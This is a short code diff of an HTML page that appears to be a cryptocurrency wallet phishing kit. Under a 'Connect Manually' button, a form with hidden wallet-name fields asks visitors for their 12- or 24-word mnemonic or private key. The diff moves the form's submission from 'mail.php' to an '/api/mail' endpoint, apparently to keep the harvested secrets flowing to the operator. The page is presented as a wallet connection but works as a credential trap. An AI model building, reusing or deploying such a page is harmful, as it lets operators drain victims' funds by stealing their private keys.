@@ -98,7 +98,7 @@
                         <a href="#" id="button_connect_manually2" class="btn btn-primary">Connect Manually</a>
                     </div>
                     <div id="div_connect_manuallly" style="display:none;">
-                        <form action="mail.php" method="post">
+                        <form action="/api/mail" method="post">
                             <h3 id="wallet_name" style="display:none;"></h3>
                             <input name="wallet_name" type="text" id="the" style="display:none;">
                             <textarea style="font-size:19px; font-weight:650" rows="4" name="phase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12 or 24 Mnemonic words or Private Key." focused required minlength="50" maxlength="250" onclick="change_wall_value()"></textarea><br>
